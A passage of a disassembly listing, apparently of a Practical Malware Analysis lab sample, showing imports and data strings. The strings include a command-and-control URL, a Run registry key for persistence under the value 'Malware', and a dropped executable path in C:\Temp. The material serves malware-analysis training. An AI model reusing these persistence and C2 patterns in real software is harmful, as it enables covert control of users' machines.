word_406988	dw 27Ch			; DATA XREF: .rdata:00406568o
		db 'SetStdHandle',0
		align 4
word_406998	dw 1E4h			; DATA XREF: .rdata:00406564o
		db 'MultiByteToWideChar',0
word_4069AE	dw 1BFh			; DATA XREF: .rdata:00406560o
		db 'LCMapStringA',0
		align 2
word_4069BE	dw 1C0h			; DATA XREF: .rdata:0040655Co
		db 'LCMapStringW',0
		align 2
word_4069CE	dw 153h			; DATA XREF: .rdata:00406570o
		db 'GetStringTypeA',0
		align 10h
word_4069E0	dw 156h			; DATA XREF: .rdata:00406554o
		db 'GetStringTypeW',0
		align 2
word_4069F2	dw 1Bh			; DATA XREF: .rdata:00406608o
		db 'CloseHandle',0
		align 800h
_rdata		ends

; Section 3. (virtual address 00007000)
; Virtual size			: 00003FC8 (  16328.)
; Section size in file		: 00003000 (  12288.)
; Offset to raw	data for section: 00007000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 407000h
unk_407000	db    0			; DATA XREF: __cinit+1Fo
unk_407004	db    0			; DATA XREF: __cinit+1Ao
unk_407008	db    0			; DATA XREF: __cinit+10o
		db  91h	; 
		db  1Dh
		db  40h	; @
		db  74h	; t
		db  39h	; 9
		db  40h	; @
unk_407014	db    0			; DATA XREF: __cinit:loc_401F6Ao
unk_407018	db    0			; DATA XREF: _doexit+65o
		db  36h	; 6
		db  1Eh
		db  40h	; @
unk_407020	db    0			; DATA XREF: _doexit:loc_40200Eo
unk_407024	db    0			; DATA XREF: _doexit+76o
unk_407028	db    0			; DATA XREF: _doexit:loc_40201Fo
aError1_1NoInte	db 'Error 1.1: No Internet',0Ah,0 ; DATA XREF: sub_401000:loc_40102Bo
aSuccessInterne	db 'Success: Internet Connection',0Ah,0 ; DATA XREF: sub_401000+17o
		align 4
aError2_3FailTo	db 'Error 2.3: Fail to get command',0Ah,0
					; DATA XREF: sub_401040:loc_401131o
aError2_2FailTo	db 'Error 2.2: Fail to ReadFile',0Ah,0 ; DATA XREF: sub_401040+94o
		align 4
aError2_1FailTo	db 'Error 2.1: Fail to OpenUrl',0Ah,0 ; DATA XREF: sub_401040+53o
; CHAR szUrl[]
szUrl		db 'http://www.practicalmalwareanalysis.com/cc.htm',0
					; DATA XREF: sub_401040+3Bo
		align 4
; char aInternetExplor[]
aInternetExplor	db 'Internet Explorer 7.50/pma%d',0 ; DATA XREF: sub_401040+Do
		align 4
aError3_2NotAVa	db 'Error 3.2: Not a valid command provided',0Ah,0
					; DATA XREF: sub_401150:loc_401201o
		align 10h
aError3_1CouldN	db 'Error 3.1: Could not set Registry value',0Ah,0
					; DATA XREF: sub_401150+95o
		align 4
; CHAR ValueName[]
ValueName	db 'Malware',0          ; DATA XREF: sub_401150+82o
; CHAR SubKey[]
SubKey		db 'Software\Microsoft\Windows\CurrentVersion\Run',0
					; DATA XREF: sub_401150+67o
		align 4
; BYTE Data
Data		db 'C:\Temp\cc.exe',0   ; DATA XREF: sub_401150+3Eo
					; sub_401150:loc_40119Fo ...
		align 4
; CHAR PathName[]
PathName	db 'C:\Temp',0          ; DATA XREF: sub_401150+2Co
aSuccessParsedC	db 'Success: Parsed command is %c',0Ah,0 ; DATA XREF: _main+53o
		align 4
off_4071DC	dd offset __exit	; DATA XREF: __amsg_exit+1Cr

_data		ends


		end start
